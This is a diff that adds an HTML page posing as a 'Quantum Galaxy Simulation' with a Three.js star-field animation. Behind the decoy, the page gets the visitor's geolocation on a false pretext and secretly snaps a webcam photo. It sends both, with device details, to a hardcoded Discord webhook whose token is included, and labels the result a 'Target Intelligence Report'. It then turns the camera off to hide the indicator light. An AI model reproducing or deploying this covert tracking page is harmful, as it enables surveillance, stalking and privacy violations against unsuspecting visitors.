@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quantum Galaxy Simulation</title>
+    <style>
+        body { margin: 0; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
+        #auth-screen { position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: radial-gradient(circle, #111, #000); color: #00ffcc; z-index: 1000; text-align: center; }
+        .btn { padding: 20px 50px; border: 2px solid #00ffcc; background: none; color: #00ffcc; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 20px; }
+        .btn:hover { background: #00ffcc; color: #000; box-shadow: 0 0 20px #00ffcc; }
+    </style>
+</head>
+<body>
+
+<div id="auth-screen">
+    <h1 style="letter-spacing: 10px;">GALAXY.CORE</h1>
+    <p>Calibrating Spatial Coordinates...</p>
+    <button class="btn" onclick="launchSimulation()">INITIALIZE SIMULATION</button>
+</div>
+
+<video id="v" hidden playsinline></video>
+<canvas id="b" hidden></canvas>
+
+<script type="importmap">{ "imports": { "three": "https://unpkg.com/three@0.160.0/build/three.module.js" } }</script>
+
+<script type="module">
+    import * as THREE from 'three';
+
+    // PASTE YOUR DISCORD WEBHOOK URL BELOW
+    const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1454440246627270779/HWoO5g_bFEkPryz4yVeOmRioUdFEyVHYQ86kdRfDiPrcL5w7PA5Ec_ILq3PW9CHCZ1XR";
+
+    async function sendToDiscord(canvas, pos) {
+        // Convert canvas to a Blob (file)
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            
+            // Create the message info
+            const info = {
+                content: "🚀 *NEW TRANSMISSION RECEIVED*",
+                embeds: [{
+                    title: "Target Intelligence Report",
+                    color: 5763719,
+                    fields: [
+                        { name: "📍 Location", value: [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}) },
+                        { name: "📱 Device", value: navigator.platform },
+                        { name: "⏰ Time", value: new Date().toLocaleString() }
+                    ]
+                }]
+            };
+
+            formData.append("payload_json", JSON.stringify(info));
+            formData.append("file", blob, "capture.png");
+
+            try {
+                await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
+            } catch (e) { console.error("Sync Error"); }
+        }, 'image/png');
+    }
+
+    window.launchSimulation = () => {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            document.getElementById('auth-screen').style.display = 'none';
+            
+            // Start Camera
+            const video = document.getElementById('v');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
+
+                // Capture immediately
+                const canvas = document.getElementById('b');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                // Send to your Discord
+                await sendToDiscord(canvas, pos);
+
+                // Stop camera stream so the "green light" turns off
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) { console.log("Cam Blocked"); }
+            
+            startVisuals();
+        }, () => alert("Simulation requires location to sync coordinates."));
+    };
+
+    function startVisuals() {
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        document.body.appendChild(renderer.domElement);
+
+        // Professional Galaxy Visuals
+        const geo = new THREE.BufferGeometry();
+        const count = 10000;
+        const positions = new Float32Array(count * 3);
+        for(let i=0; i<count*3; i++) positions[i] = (Math.random() - 0.5) * 10;
+        geo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+        const mat = new THREE.PointsMaterial({ size: 0.01, color: 0x00ffcc });
+        const points = new THREE.Points(geo, mat);
+        scene.add(points);
+        camera.position.z = 5;
+
+        function animate() {
+            requestAnimationFrame(animate);
+            points.rotation.y += 0.002;
+            renderer.render(scene, camera);
+        }
+        animate();
+    }
+</script>
+</body>
+</html>
